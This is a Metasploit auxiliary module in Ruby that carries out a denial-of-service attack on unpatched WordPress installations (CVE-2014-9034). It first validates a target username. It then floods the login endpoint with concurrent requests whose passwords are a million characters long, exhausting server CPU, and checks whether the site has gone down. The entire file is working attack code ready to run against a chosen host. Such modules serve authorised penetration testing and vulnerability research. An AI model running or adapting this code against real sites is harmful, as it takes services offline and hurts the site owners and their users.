##
# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary
  include Msf::HTTP::Wordpress
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'WordPress Long Password DoS',
      'Description'     => %q{WordPress before 3.7.5, 3.8.x before 3.8.5, 3.9.x before 3.9.3, and 4.x
                              before 4.0.1 allows remote attackers to cause a denial of service
                              (CPU consumption) via a long password that is improperly handled
                              during hashing.},
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'Javier Nieto Arevalo',           # Vulnerability disclosure
          'Andres Rojas Guerrero',          # Vulnerability disclosure
          'Rob Carr <rob[at]rastating.com>' # Metasploit module
        ],
      'References'      =>
        [
          ['URL', 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-9034'],
          ['OSVDB', '114857'],
          ['WPVDB', '7681']
        ],
      'DisclosureDate'  => 'Nov 20 2014'
    ))

    register_options(
      [
        OptInt.new('PLENGTH', [true, 'Length of password to use', 1000000]),
        OptInt.new('RLIMIT', [true, 'The number of requests to send', 200]),
        OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5]),
        OptString.new('USERNAME', [true, 'The username to send the requests with', '']),
        OptBool.new('VALIDATE_USER', [true, 'Validate the specified username', true])
      ], self.class)
  end

  def rlimit
    datastore['RLIMIT']
  end

  def plength
    datastore['PLENGTH']
  end

  def username
    datastore['USERNAME']
  end

  def validate_user
    datastore['VALIDATE_USER']
  end

  def thread_count
    datastore['THREADS']
  end

  def timeout
    datastore['TIMEOUT']
  end

  def user_exists(user)
    exists = wordpress_user_exists?(user)
    if exists
      print_good("#{peer} - Username \"#{username}\" is valid")
      report_auth_info(
        :host => rhost,
        :sname => (ssl ? 'https' : 'http'),
        :user => user,
        :port => rport,
        :proof => "WEBAPP=\"Wordpress\", VHOST=#{vhost}"
      )

      return true
    else
      print_error("#{peer} - \"#{user}\" is not a valid username")
      return false
    end
  end

  def run
    if wordpress_and_online?
      if validate_user
        print_status("#{peer} - Checking if user \"#{username}\" exists...")
        unless user_exists(username)
          print_error('Aborting operation - a valid username must be specified')
          return
        end
      end

      starting_thread = 1
      while starting_thread < rlimit do
        ubound = [rlimit - (starting_thread - 1), thread_count].min
        print_status("#{peer} - Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...")

        threads = []
        1.upto(ubound) do |i|
          threads << framework.threads.spawn("Module(#{self.refname})-request#{(starting_thread - 1) + i}", false, i) do |i|
            begin
              wordpress_login(username, Rex::Text.rand_text_alpha(plength), timeout)
            rescue => e
              print_error("#{peer} - Timed out during request #{(starting_thread - 1) + i}")
            end
          end
        end

        threads.each(&:join)
        print_good("#{peer} - Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}")
        starting_thread += ubound
      end

      if wordpress_and_online?
        print_error("#{peer} - FAILED: #{target_uri} appears to still be online")
      else
        print_good("#{peer} - SUCCESS: #{target_uri} appears to be down")
      end
    else
      print_error("#{rhost}:#{rport}#{target_uri} does not appear to be running WordPress")
    end
  end
end
